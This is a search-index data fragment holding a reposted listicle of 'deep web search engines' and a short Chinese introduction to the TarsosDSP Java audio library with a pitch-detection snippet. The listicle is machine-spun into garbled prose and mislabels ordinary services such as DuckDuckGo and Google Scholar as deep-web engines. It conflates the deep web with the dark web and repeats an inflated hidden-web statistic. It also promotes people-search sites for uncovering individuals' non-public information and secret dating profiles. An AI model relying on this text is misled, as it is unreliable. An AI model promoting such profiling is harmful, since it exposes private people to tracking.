association and recall. 5. Way Back Machine The Wayback Machine is an front end to the Internet Archive\u2019s gathering of open Web pages in Deep Web Search Engine family . It incorporates more than 100 terabytes of date\u2014a colossal gathering with immense stockpiling prerequisites. The Wayback Machine gives access to this abundance of information by URLs. It is not content accessible\u2014a client has to know the correct URL of a specific Web page, or possibly the Web website, to have the capacity to enter the chronicle. The Internet Archive allows the public to upload and download digital material to its data cluster, but the bulk of its data is collected automatically by its web crawlers, which work to preserve as much of the public web as possible. Its web archive, the Deep Web Search Engine Wayback Machine , contains over 150 billion web captures. The Archive also oversees one of the world\u2019s largest book digitization projects. 6. Google Scholar similar work link Deep Web Search Engine , a Google Scholar allows you to search across a wide range of academic literature. It draws on information from journal publishers, university repositories, and other websites that it has identified as scholarly. Google Scholar is designed to help you discover scholarly sources that exist on your topic. Once you discover these sources, you\u2019ll want to get your hands on them . You can configure Google Scholar to allow automatic access to the NCSU Libraries\u2019 subscriptions to journals and databases 7. DuckDuckgo This deep web search engine which, like many other deep web search engines on this list, also lets you search the regular web\u2014has a clean and easy to use interface and doesn\u2019t track your discoveries. The options for topics to search are endless, and you can even customize it to enhance your experience. DuckDuckGo Deep Web Search Engine emphasizes returning the best results, rather than the most results, and generates those results from over 400 individual sources, including key crowdsourced sites such as Wikipedia , and other search engines like Bing , Ya h oo! , Yandex , and Yummly . 8. Fazzle Fazzle.com is a meta web index Deep Web Search Engine which is accessible in English, French, and Dutch. Fazzle looks more than 120 changed web indexes to convey \u2018quick exact outcomes\u2019 joined by a see page alongside each posting. Fazzle\u2019s Deep Web Search Engine query items incorporate Web, Downloads, Images, Videos, Audio, Yellow Pages, White Pages, Shopping and News. In this Deep Web Search Engine, Not at all like the greater part of the more well known meta web indexes available, Fazzle\u2019s outcomes are not covered with supported connections and Fazzle just devotes the #1 spot in the list items for promoting. Whatever is left of the query items are assembled from the numerous pursuit lists which Fazzle runs seeks however to decide its \u201cBest Pick\u201d and 20 different outcomes on its SERPS pages. 9. not Evil Unlike other Tor search engines (http://hss3uro2hsxfogfq.onion), this Deep Web Search Engine not Evil is not for profit. The cost to run not Evil is a contribution to what one hopes is a growing shield against the tyranny of an intolerant majority Not Evil is another Deep Web Search Engine in the TOR network. According to its functionality and quality it is highly competitive with the competitors. There is no advertising and tracking. Due to thoughtful and continuously updated algorithms of search it is easy to find the necessary goods, content or information. Using not Evil, you can save a lot of time and keep total anonymity. The user interface is highly intuitive. It should be noted that previously this project was widely known as TorSearch. 10. Start Page If you\u2019re worried about privacy, Ixquick\u2019s Start Page is one the best search engines available, even if you\u2019re not using Tor. Unlike other search engines, this Deep Web Search Engine Start Page doesn\u2019t record your IP address, allowing you to keep your search history secret. It\u2019s bothersome that Google knows everything about you. 11. Spokeo Another best Deep Web Search Engine and Thanks to 12 billion public records, which are at disposal of Spokeo, reverse phone check can give the newest data about the most recent phone number owner. So, after running a search, there will be the location, email addresses, social media profiles and even additional criminal records at your service. This website is really simple in use, just fill the 10-digit phone number in the special line and press \u201cSearch\u201d. You can use Spokeo in case if you want to find the lost family member or friend, check your loved ones, avoid scammers, find more clues about the person, check who is phoning you, find another chance to contact person and etc. 12. InfoTracer InfoTracer\u2019s deep web search tool is specialized on finding people and their non-public information in the deep web. Uncovering hidden activity is one of the specialisations of InfoTracer. You can find out if someone keeps a secret social and dating profile or has any other hidden online activity. Another specialization is checking if your information has been leaked in a data breach by looking up leaked records. Deep Web Search Engine \u2013 Conclusion The deep web search engine highlighted here are based on the review, privacy and how efficiently they pull the results matches to the query. There are trillion of GB data has secretly maintain under the private area which we can access by the normal search engine since those content are not indexed at any cost. above list content is best among best deep web search engine for those who looking for the surfing the some anonymous content in the internet. These above mentioned search engines are that give you deep insights and surf deeply to drive deeply and gives you the no indexed contents. \u539f\u6587\u94fe\u63a5\uff1a https://gbhackers.com/top-10-deep-web-search-engines-which-gives-deep-information-that-you-cant-get-it-in-google-and-bing/","title":"TOP 11 Deep Web Search Engine Alternative for Google and Bing 2021"},{"location":"other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/#top-11-deep-web-search-engine-alternative-for-google-and-bing-2021","text":"[ Deep Web Search Engine is an alternative search engine when we need to search something, then Google or Bing will the first choice hit in mind suddenly. But unlike the Deep Web Search Engine, Google and Bing will not give all the Hidden information which is served under the Dark web . Google has the ability to track your each and every move on the Internet while you are searching via Google.. If you don\u2019t want Google to collect your personal information and your online activities you should maintain your Anonymity online. \u201cDeep web\u201d Also known as \u201cinvisible web\u201d, the term refers to a vast repository of underlying content, such as documents in online databases that general-purpose web crawlers cannot reach. The deep web content is estimated at 500 times Bigger than Normal search contents, yet has remained mostly untapped due to the limitations of traditional search engines. Since most personal profiles, public records and other people-related documents are stored in databases and not on static web pages, most of the higher-quality information about people is simply \u201cinvisible\u201d to a regular search engine but we can get it from Deep Web Search Engine.","title":"TOP 11 Deep Web Search Engine Alternative for Google and Bing 2021"},{"location":"other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/#why-doesnt-google-provide-deep-web-search-results","text":"Basically, Deep web or Dark Web secret contents Don\u2019t index to provide Results by normal Search Engines such as Google and Bing. all the Deb websites (.onion) are unindexed but few results we can crawl via Deep Web Search Engine. Google will not provide Search results which don\u2019t index by world wide web.The content is hidden behind HTML forms. Regular searches which you are searching by google and its result re-drive from interconnected servers and content publishers are optimizing their content by learning best search engine optimization training to provide a better result for google search users. (adsbygoogle=window.adsbygoogle||[]).push({}); When you access the dark web, you\u2019re not surfing the interconnected servers you regularly interact with; instead, everything stays internal on the Tor network, which provides security and privacy to everyone equally. \u201cAccording to the Researchers, only 4 % of the Internet is visible to the general public and remaining 96% of Website and Data\u2019s hidden behind the Deep web\u201d Deep web contains many illegal Activities including Drugs, Weapon Dealing, highly sophisticated hacking tools, Illegal Pornography, Government Military secret, and other illegal Actives.","title":"Why doesn\u2019t Google provide Deep web Search Results?"},{"location":"other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/#robots-exclusion","text":"The robots.txt document, which more often than not lives in the principle catalog of a site, tells seek robots which records and registries, files and directories should not be indexed. Henceforth the name \u201crobots Exclusion Files.\u201d If this record is set up, it will hinder certain pages from being listed, which will then be imperceptible to searchers. Blog stages normally offer this component. Here we go for the interesting Search Engines to get the deep search results which are probably most of the Peoples Don\u2019t aware.","title":"Robots Exclusion:"},{"location":"other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/#also-read-tor-and-vpn-anonymous-enough-for-dark-web","text":"","title":"Also Read: TOR and VPN Anonymous enough for Dark Web"},{"location":"other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/#deep-web-search-engines-2021","text":"","title":"Deep Web Search Engines 2021"},{"location":"other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/#1pipl","text":"Pipl\u2019s query-engine helps you find deep web pages that cannot be found on regular search engines. Unlike other searching Engines link Google and Bing, pipl Deep Web Search Engine provide search results retrieved from Deep Web. Pipl robots are set to interact with searchable databases and extract facts, contact details and other relevant information from personal profiles, member directories, scientific publications, court records and numerous other deep-web sources. According to pipl , they using advanced language-analysis and ranking algorithms to bring you the most relevant bits of information about a person in a single, easy-to-read results page.","title":"1.pipl"},{"location":"other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/#2-my-life","text":"A Mylife Deep Web Search Engine Public Page can list a person\u2019s data including age, past and current places of residence, telephone numbers, email addresses, employments, instruction, photos, relatives, a smaller than expected history and an individual survey segment which urges other Mylife individuals to rate each other. You can register for this service and get a fair amount of information for free but for $6.95 US Dollars, you can use the service for a month and get full reports and all kinds of juicy information. Mylife cases to have \u201cmore than 225 million Public Pages with data about practically everybody in America, 18 years of age and over.\u201d According to MyLife, an \u201cOpen Page can\u2019t be erased\u201d and \u201cjust premium individuals can conceal content on their Public Page and expel the information from the first source.","title":"2. My Life"},{"location":"other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/#3-yippy","text":"Yippy in fact a Metasearch Engine (it gets its outcomes by utilizing other web indexes), I\u2019ve included Yippy here as it has a place with an entryway of devices a web client might be occupied with, for example, such as email, games, videos and so on. Yippy cases to be a family cordial site and particular of protection(Privacy). Not at all like Google they don\u2019t store your history, look terms or email which is an or more point, yet the traditionalist family well-disposed picture has influenced seek quality. They assert 5 million \u201cundesirable\u201d sites have been blocked from its index to protect sensitive searchers. A search for [alcohol] returns results of alcoholics, anonymous groups, rather than say, a Wikipedia page on what alcohol is for example. So Yippy is no good for people looking for information but may be of interest to parents of laptop owning children.","title":"3. Yippy"},{"location":"other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/#4-surfwax","text":"SurfWax Deep Web Search Engine is available as a free and a subscription-based service. The search site is bundled with a number of features other than plain search. The features include: \u201cFocus\u201d link to add \u201cfocus words\u201d that you can add to the search. The focus words are narrower or broader terms that can be used to expand or narrow your search. \u201cSiteSnaps\u201d highlight ( an amplifying glass symbol to one side of the outcome ) for getting a rundown of the website page and furthermore to recognize what terms the motor considered as pertinent \u201cResultStats\u201d highlight to have the measurements on the wellspring of the considerable number of results and the time it took to recover the outcomes. According to Surfwax, On waves, surf wax helps surfers grip their surfboard; for Web surfing, SurfWax helps you get the best grip on information \u2014 providing the \u201cbest use\u201d of relevant search results. Deep Web Search Engine SurfWax\u2019s design/UI was the first to make searching a \u201cvisual process,\u201d seamlessly integrating meaning-based search with key knowledge-finding elements for effective association and recall.","title":"4. Surfwax"},{"location":"other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/#5-way-back-machine","text":"The Wayback Machine is an front end to the Internet Archive\u2019s gathering of open Web pages in Deep Web Search Engine family . It incorporates more than 100 terabytes of date\u2014a colossal gathering with immense stockpiling prerequisites. The Wayback Machine gives access to this abundance of information by URLs. It is not content accessible\u2014a client has to know the correct URL of a specific Web page, or possibly the Web website, to have the capacity to enter the chronicle. The Internet Archive allows the public to upload and download digital material to its data cluster, but the bulk of its data is collected automatically by its web crawlers, which work to preserve as much of the public web as possible. Its web archive, the Deep Web Search Engine Wayback Machine , contains over 150 billion web captures. The Archive also oversees one of the world\u2019s largest book digitization projects.","title":"5. Way Back Machine"},{"location":"other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/#6-google-scholar","text":"similar work link Deep Web Search Engine , a Google Scholar allows you to search across a wide range of academic literature. It draws on information from journal publishers, university repositories, and other websites that it has identified as scholarly. Google Scholar is designed to help you discover scholarly sources that exist on your topic. Once you discover these sources, you\u2019ll want to get your hands on them . You can configure Google Scholar to allow automatic access to the NCSU Libraries\u2019 subscriptions to journals and databases","title":"6. Google Scholar"},{"location":"other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/#7-duckduckgo","text":"This deep web search engine which, like many other deep web search engines on this list, also lets you search the regular web\u2014has a clean and easy to use interface and doesn\u2019t track your discoveries. The options for topics to search are endless, and you can even customize it to enhance your experience. DuckDuckGo Deep Web Search Engine emphasizes returning the best results, rather than the most results, and generates those results from over 400 individual sources, including key crowdsourced sites such as Wikipedia , and other search engines like Bing , Ya h oo! , Yandex , and Yummly .","title":"7. DuckDuckgo"},{"location":"other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/#8-fazzle","text":"Fazzle.com is a meta web index Deep Web Search Engine which is accessible in English, French, and Dutch. Fazzle looks more than 120 changed web indexes to convey \u2018quick exact outcomes\u2019 joined by a see page alongside each posting. Fazzle\u2019s Deep Web Search Engine query items incorporate Web, Downloads, Images, Videos, Audio, Yellow Pages, White Pages, Shopping and News. In this Deep Web Search Engine, Not at all like the greater part of the more well known meta web indexes available, Fazzle\u2019s outcomes are not covered with supported connections and Fazzle just devotes the #1 spot in the list items for promoting. Whatever is left of the query items are assembled from the numerous pursuit lists which Fazzle runs seeks however to decide its \u201cBest Pick\u201d and 20 different outcomes on its SERPS pages.","title":"8. Fazzle"},{"location":"other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/#9-not-evil","text":"Unlike other Tor search engines (http://hss3uro2hsxfogfq.onion), this Deep Web Search Engine not Evil is not for profit. The cost to run not Evil is a contribution to what one hopes is a growing shield against the tyranny of an intolerant majority Not Evil is another Deep Web Search Engine in the TOR network. According to its functionality and quality it is highly competitive with the competitors. There is no advertising and tracking. Due to thoughtful and continuously updated algorithms of search it is easy to find the necessary goods, content or information. Using not Evil, you can save a lot of time and keep total anonymity. The user interface is highly intuitive. It should be noted that previously this project was widely known as TorSearch.","title":"9. not Evil"},{"location":"other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/#10-start-page","text":"If you\u2019re worried about privacy, Ixquick\u2019s Start Page is one the best search engines available, even if you\u2019re not using Tor. Unlike other search engines, this Deep Web Search Engine Start Page doesn\u2019t record your IP address, allowing you to keep your search history secret. It\u2019s bothersome that Google knows everything about you.","title":"10. Start Page"},{"location":"other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/#11-spokeo","text":"Another best Deep Web Search Engine and Thanks to 12 billion public records, which are at disposal of Spokeo, reverse phone check can give the newest data about the most recent phone number owner. So, after running a search, there will be the location, email addresses, social media profiles and even additional criminal records at your service. This website is really simple in use, just fill the 10-digit phone number in the special line and press \u201cSearch\u201d. You can use Spokeo in case if you want to find the lost family member or friend, check your loved ones, avoid scammers, find more clues about the person, check who is phoning you, find another chance to contact person and etc.","title":"11. Spokeo"},{"location":"other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/#12-infotracer","text":"InfoTracer\u2019s deep web search tool is specialized on finding people and their non-public information in the deep web. Uncovering hidden activity is one of the specialisations of InfoTracer. You can find out if someone keeps a secret social and dating profile or has any other hidden online activity. Another specialization is checking if your information has been leaked in a data breach by looking up leaked records.","title":"12. InfoTracer"},{"location":"other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/#deep-web-search-engine-conclusion","text":"The deep web search engine highlighted here are based on the review, privacy and how efficiently they pull the results matches to the query. There are trillion of GB data has secretly maintain under the private area which we can access by the normal search engine since those content are not indexed at any cost. above list content is best among best deep web search engine for those who looking for the surfing the some anonymous content in the internet. These above mentioned search engines are that give you deep insights and surf deeply to drive deeply and gives you the no indexed contents. \u539f\u6587\u94fe\u63a5\uff1a https://gbhackers.com/top-10-deep-web-search-engines-which-gives-deep-information-that-you-cant-get-it-in-google-and-bing/","title":"Deep Web Search Engine \u2013 Conclusion"},{"location":"other/TarsosDSP%20%E7%AE%80%E4%BB%8B%203.TarsosDSP%20%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F/","text":"TarsosDSP \u7b80\u4ecb 1.\u4ec0\u4e48\u662f TarsosDSP\uff1f TarsosDSP \u662f\u4e00\u4e2a\u7528\u4e8e\u97f3\u9891\u5904\u7406\u7684Java\u5e93\u3002 \u5b83\u7684\u76ee\u6807\u662f\u63d0\u4f9b\u4e00\u4e2a\u6613\u4e8e\u4f7f\u7528\u7684\u754c\u9762\uff0c\u4ee5\u4fbf\u5728\u7eafJava\u4e2d\u5c3d\u53ef\u80fd\u7b80\u5355\u5730\u5b9e\u73b0\u5b9e\u7528\u7684\u97f3\u9891\u5904\u7406\u7b97\u6cd5\uff0c\u800c\u65e0\u9700\u4efb\u4f55\u5176\u4ed6\u5916\u90e8\u4f9d\u8d56\u3002 \u8fd9\u4e2a\u5e93\u8bd5\u56fe\u5728\u80fd\u591f\u5b8c\u6210\u4efb\u52a1\uff0c\u4f46\u8db3\u591f\u7b80\u6d01\u3002 TarsosDSP \u7684\u7279\u70b9\u662f\u5b9e\u73b0\u4e86\u4e00\u4e2a\u51b2\u51fb\u8d77\u59cb\u68c0\u6d4b\u5668\u548c\u4e00\u4e9b\u95f4\u8ddd\u68c0\u6d4b\u7b97\u6cd5\uff1aYIN\uff0cMcleod Pitch\u65b9\u6cd5\u548c\u4e00\u4e2a\u201c\u52a8\u6001\u5c0f\u6ce2\u7b97\u6cd5\u95f4\u8ddd\u8ddf\u8e2a\u201d\u7b97\u6cd5\u3002 \u5b83\u8fd8\u5b9e\u73b0\u4e86Goertzel DTMF\u89e3\u7801\u7b97\u6cd5\uff0c\u65f6\u95f4\u62c9\u4f38\u7b97\u6cd5\uff08WSOLA\uff09\uff0c\u91cd\u91c7\u6837\uff0c\u6ee4\u6ce2\u5668\uff0c\u7b80\u5355\u5408\u6210\uff0c\u4e00\u4e9b\u97f3\u9891\u6548\u679c\u548c\u53d8\u8c03\u7b97\u6cd5\u3002 2.TarsosDSP \u90fd\u80fd\u5b9e\u73b0\u54ea\u4e9b\u529f\u80fd\uff1f \u58f0\u97f3\u68c0\u6d4b\u5668\uff1a\u663e\u793a\u5982\u4f55\u54cd\u5ea6\u8ba1\u7b97\u53ef\u4ee5\u5b8c\u6210\u3002\u5f53\u8f93\u5165\u58f0\u97f3\u8d85\u8fc7\u9650\u5b9a\u7684\u4e8b\u4ef6\u88ab\u89e6\u53d1\u3002 \u97f3\u9ad8\u68c0\u6d4b\u5668\uff1a\u8fd9\u4e2a\u6f14\u793a\u5e94\u7528\u7a0b\u5e8f\u663e\u793a\u5b9e\u65f6\u97f3\u9ad8\u68c0\u6d4b\u3002\u5f53\u68c0\u6d4b\u5230\u97f3\u8c03\u65f6\uff0c\u8d6b\u5179\u503c\u4ee5\u6982\u7387\u4e00\u8d77\u6253\u5370\u3002 \u6572\u51fb\u68c0\u6d4b\u5668\uff1a\u663e\u793a\u6572\u51fb\u7684\u68c0\u6d4b\u3002\u62cd\u624b\u4f1a\u5bfc\u81f4\u4e00\u4e2a\u6572\u51fb\u4e8b\u4ef6\u3002\u8fd9\u4e2a\u6f14\u793a\u5e94\u7528\u7a0b\u5e8f\u8fd8\u663e\u793a\u4e86\u8fd9\u4e24\u4e2a\u53c2\u6570\u5bf9\u7b97\u6cd5\u7684\u5f71\u54cd\u3002 UtterAsterisk\uff1a\u662f\u4e00\u4e2a\u5531\u4e0e\u76ee\u6807\u5c3d\u53ef\u80fd\u63a5\u8fd1\u65cb\u5f8b\u7684\u6e38\u620f\u3002\u4ece\u6280\u672f\u4e0a\u8bb2\uff0c\u5b83\u4f7f\u7528YIN\u6216MPM\u5b9e\u65f6\u68c0\u6d4b\u97f3\u9ad8\u3002 Goertzel DTMF\uff08\u53cc\u97f3\u591a\u9891\uff09\uff1a\u89e3\u7801Goertzel\u7b97\u6cd5\u7684\u5b9e\u73b0\u3002 \u97f3\u9891\u65f6\u95f4\u62c9\u4f38 \uff1a \u5728\u7eaf Java \u4e2d\u5b9e\u73b0\u4f7f\u7528WSOLA\u5b9e\u73b0\u4e00\u4e2a\u65f6\u95f4\u62c9\u4f38\u7b97\u6cd5\u3002 WSOLA\u53ef\u4ee5\u5728\u4e0d\u6539\u53d8\u97f3\u9ad8\u7684\u60c5\u51b5\u4e0b\u6539\u53d8\u97f3\u9891\u7684\u64ad\u653e\u901f\u5ea6\u3002\u64ad\u653e\u901f\u5ea6\u53ef\u4ee5\u968f\u65f6\u6539\u53d8\uff0c\u5373\u4f7f\u6709\u97f3\u9891\u6b63\u5728\u64ad\u653e\u3002 \u97f3\u9891\u7279\u5f81\u63d0\u53d6\uff1a\u4e00\u4e2a\u547d\u4ee4\u884c\u5e94\u7528\u7a0b\u5e8f\u6765\u505a\u7b80\u5355\u7684\u7279\u5f81\u63d0\u53d6\u3002 \u97f3\u9891\u5408\u6210\uff1a\u4e00\u4e2a\u547d\u4ee4\u884c\u5e94\u7528\u7a0b\u5e8f\u6765\u505a\u7b80\u5355\u7684\u97f3\u9891\u5408\u6210\u3002 \u97f3\u9ad8\u79fb\u52a8\uff1a\u4e00\u4e2a\u793a\u4f8b\u5e94\u7528\u7a0b\u5e8f\uff0c\u65e0\u8bba\u662f\u5b9e\u65f6\u9ea6\u514b\u98ce\u8f93\u5165\u8fd8\u662f\u5f55\u5236\u7684\u97f3\u9891\uff0c\u90fd\u53ef\u4ee5\u8fdb\u884c\u97f3\u9ad8\u79fb\u4f4d\u3002\u8fd8\u5305\u62ec\u4e00\u4e2a\u547d\u4ee4\u884c\u5e94\u7528\u7a0b\u5e8f\u6765\u505a\u97f3\u9ad8\u8f6c\u6362\u3002 3.TarsosDSP \u662f\u5982\u4f55\u5de5\u4f5c\u7684\uff1f AudioDispatcher dispatcher = AudioDispatcherFactory.fromDefaultMicrophone(22050,1024,0); PitchDetectionHandler pdh = new PitchDetectionHandler() { @Override public void handlePitch(PitchDetectionResult result,AudioEvent e) { final float pitchInHz = result.getPitch(); runOnUiThread(new Runnable() { @Override public void run() { TextView text = (TextView) findViewById(R.id.textView1); text.setText(\"\" + pitchInHz); } }); } }; AudioProcessor p = new PitchProcessor(PitchEstimationAlgorithm.FFT_YIN, 22050, 1024, pdh); dispatcher.addAudioProcessor(p); new Thread(dispatcher,\"Audio Dispatcher\").start(); 4.\u5982\u4f55\u83b7\u53d6\u548c\u4f7f\u7528 TarsosDSP \u70b9\u51fb\u6b64\u94fe\u63a5\u8df3\u8f6c\u81f3\u5b98\u65b9\u7f51\u7ad9 \u539f\u6587\u94fe\u63a5\uff1a https://jacksmiththu.github.io/2017/12/25/TarsosDSP\u7b80\u4ecb/","title":"TarsosDSP \u7b80\u4ecb 3.TarsosDSP \u662f\u5982\u4f55\u5de5\u4f5c\u7684\uff1f"},{"location":"other/TarsosDSP%20%E7%AE%80%E4%BB%8B%203.TarsosDSP%20%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F/#tarsosdsp","text":"","title":"TarsosDSP \u7b80\u4ecb"},{"location":"other/TarsosDSP%20%E7%AE%80%E4%BB%8B%203.TarsosDSP%20%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F/#1-tarsosdsp","text":"TarsosDSP \u662f\u4e00\u4e2a\u7528\u4e8e\u97f3\u9891\u5904\u7406\u7684Java\u5e93\u3002 \u5b83\u7684\u76ee\u6807\u662f\u63d0\u4f9b\u4e00\u4e2a\u6613\u4e8e\u4f7f\u7528\u7684\u754c\u9762\uff0c\u4ee5\u4fbf\u5728\u7eafJava\u4e2d\u5c3d\u53ef\u80fd\u7b80\u5355\u5730\u5b9e\u73b0\u5b9e\u7528\u7684\u97f3\u9891\u5904\u7406\u7b97\u6cd5\uff0c\u800c\u65e0\u9700\u4efb\u4f55\u5176\u4ed6\u5916\u90e8\u4f9d\u8d56\u3002 \u8fd9\u4e2a\u5e93\u8bd5\u56fe\u5728\u80fd\u591f\u5b8c\u6210\u4efb\u52a1\uff0c\u4f46\u8db3\u591f\u7b80\u6d01\u3002 TarsosDSP \u7684\u7279\u70b9\u662f\u5b9e\u73b0\u4e86\u4e00\u4e2a\u51b2\u51fb\u8d77\u59cb\u68c0\u6d4b\u5668\u548c\u4e00\u4e9b\u95f4\u8ddd\u68c0\u6d4b\u7b97\u6cd5\uff1aYIN\uff0cMcleod Pitch\u65b9\u6cd5\u548c\u4e00\u4e2a\u201c\u52a8\u6001\u5c0f\u6ce2\u7b97\u6cd5\u95f4\u8ddd\u8ddf\u8e2a\u201d\u7b97\u6cd5\u3002 \u5b83\u8fd8\u5b9e\u73b0\u4e86Goertzel DTMF\u89e3\u7801\u7b97\u6cd5\uff0c\u65f6\u95f4\u62c9\u4f38\u7b97\u6cd5\uff08WSOLA\uff09\uff0c\u91cd\u91c7\u6837\uff0c\u6ee4\u6ce2\u5668\uff0c\u7b80\u5355\u5408\u6210\uff0c\u4e00\u4e9b\u97f3\u9891\u6548\u679c\u548c\u53d8\u8c03\u7b97\u6cd5\u3002","title":"1.\u4ec0\u4e48\u662f TarsosDSP\uff1f"},{"location":"other/TarsosDSP%20%E7%AE%80%E4%BB%8B%203.TarsosDSP%20%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F/#2tarsosdsp","text":"\u58f0\u97f3\u68c0\u6d4b\u5668\uff1a\u663e\u793a\u5982\u4f55\u54cd\u5ea6\u8ba1\u7b97\u53ef\u4ee5\u5b8c\u6210\u3002\u5f53\u8f93\u5165\u58f0\u97f3\u8d85\u8fc7\u9650\u5b9a\u7684\u4e8b\u4ef6\u88ab\u89e6\u53d1\u3002 \u97f3\u9ad8\u68c0\u6d4b\u5668\uff1a\u8fd9\u4e2a\u6f14\u793a\u5e94\u7528\u7a0b\u5e8f\u663e\u793a\u5b9e\u65f6\u97f3\u9ad8\u68c0\u6d4b\u3002\u5f53\u68c0\u6d4b\u5230\u97f3\u8c03\u65f6\uff0c\u8d6b\u5179\u503c\u4ee5\u6982\u7387\u4e00\u8d77\u6253\u5370\u3002 \u6572\u51fb\u68c0\u6d4b\u5668\uff1a\u663e\u793a\u6572\u51fb\u7684\u68c0\u6d4b\u3002\u62cd\u624b\u4f1a\u5bfc\u81f4\u4e00\u4e2a\u6572\u51fb\u4e8b\u4ef6\u3002\u8fd9\u4e2a\u6f14\u793a\u5e94\u7528\u7a0b\u5e8f\u8fd8\u663e\u793a\u4e86\u8fd9\u4e24\u4e2a\u53c2\u6570\u5bf9\u7b97\u6cd5\u7684\u5f71\u54cd\u3002 UtterAsterisk\uff1a\u662f\u4e00\u4e2a\u5531\u4e0e\u76ee\u6807\u5c3d\u53ef\u80fd\u63a5\u8fd1\u65cb\u5f8b\u7684\u6e38\u620f\u3002\u4ece\u6280\u672f\u4e0a\u8bb2\uff0c\u5b83\u4f7f\u7528YIN\u6216MPM\u5b9e\u65f6\u68c0\u6d4b\u97f3\u9ad8\u3002 Goertzel DTMF\uff08\u53cc\u97f3\u591a\u9891\uff09\uff1a\u89e3\u7801Goertzel\u7b97\u6cd5\u7684\u5b9e\u73b0\u3002 \u97f3\u9891\u65f6\u95f4\u62c9\u4f38 \uff1a \u5728\u7eaf Java \u4e2d\u5b9e\u73b0\u4f7f\u7528WSOLA\u5b9e\u73b0\u4e00\u4e2a\u65f6\u95f4\u62c9\u4f38\u7b97\u6cd5\u3002 WSOLA\u53ef\u4ee5\u5728\u4e0d\u6539\u53d8\u97f3\u9ad8\u7684\u60c5\u51b5\u4e0b\u6539\u53d8\u97f3\u9891\u7684\u64ad\u653e\u901f\u5ea6\u3002\u64ad\u653e\u901f\u5ea6\u53ef\u4ee5\u968f\u65f6\u6539\u53d8\uff0c\u5373\u4f7f\u6709\u97f3\u9891\u6b63\u5728\u64ad\u653e\u3002 \u97f3\u9891\u7279\u5f81\u63d0\u53d6\uff1a\u4e00\u4e2a\u547d\u4ee4\u884c\u5e94\u7528\u7a0b\u5e8f\u6765\u505a\u7b80\u5355\u7684\u7279\u5f81\u63d0\u53d6\u3002 \u97f3\u9891\u5408\u6210\uff1a\u4e00\u4e2a\u547d\u4ee4\u884c\u5e94\u7528\u7a0b\u5e8f\u6765\u505a\u7b80\u5355\u7684\u97f3\u9891\u5408\u6210\u3002 \u97f3\u9ad8\u79fb\u52a8\uff1a\u4e00\u4e2a\u793a\u4f8b\u5e94\u7528\u7a0b\u5e8f\uff0c\u65e0\u8bba\u662f\u5b9e\u65f6\u9ea6\u514b\u98ce\u8f93\u5165\u8fd8\u662f\u5f55\u5236\u7684\u97f3\u9891\uff0c\u90fd\u53ef\u4ee5\u8fdb\u884c\u97f3\u9ad8\u79fb\u4f4d\u3002\u8fd8\u5305\u62ec\u4e00\u4e2a\u547d\u4ee4\u884c\u5e94\u7528\u7a0b\u5e8f\u6765\u505a\u97f3\u9ad8\u8f6c\u6362\u3002","title":"2.TarsosDSP \u90fd\u80fd\u5b9e\u73b0\u54ea\u4e9b\u529f\u80fd\uff1f"},{"location":"other/TarsosDSP%20%E7%AE%80%E4%BB%8B%203.TarsosDSP%20%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F/#3tarsosdsp","text":"AudioDispatcher dispatcher = AudioDispatcherFactory.fromDefaultMicrophone(22050,1024,0); PitchDetectionHandler pdh = new PitchDetectionHandler() { @Override public void handlePitch(PitchDetectionResult result,AudioEvent e) { final float pitchInHz = result.getPitch(); runOnUiThread(new Runnable() { @Override public void run() { TextView text = (TextView) findViewById(R.id.textView1); text.setText(\"\" + pitchInHz); } }); } }; AudioProcessor p = new PitchProcessor(PitchEstimationAlgorithm.FFT_YIN, 22050, 1024, pdh); dispatcher.addAudioProcessor(p); new Thread(dispatcher,\"Audio Dispatcher\").start();","title":"3.TarsosDSP \u662f\u5982\u4f55\u5de5\u4f5c\u7684\uff1f"},{"location":"other/TarsosDSP%20%E7%AE%80%E4%BB%8B%203.TarsosDSP%20%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F/#4-tarsosdsp","text":"\u70b9\u51fb\u6b64\u94fe\u63a5\u8df3\u8f6c\u81f3\u5b98\u65b9\u7f51\u7ad9 \u539f\u6587\u94fe\u63a5\uff1a https://jacksmiththu.github.io/2017/12/25/TarsosDSP\u7b80\u4ecb/","title":"4.\u5982\u4f55\u83b7\u53d6\u548c\u4f7f\u7528 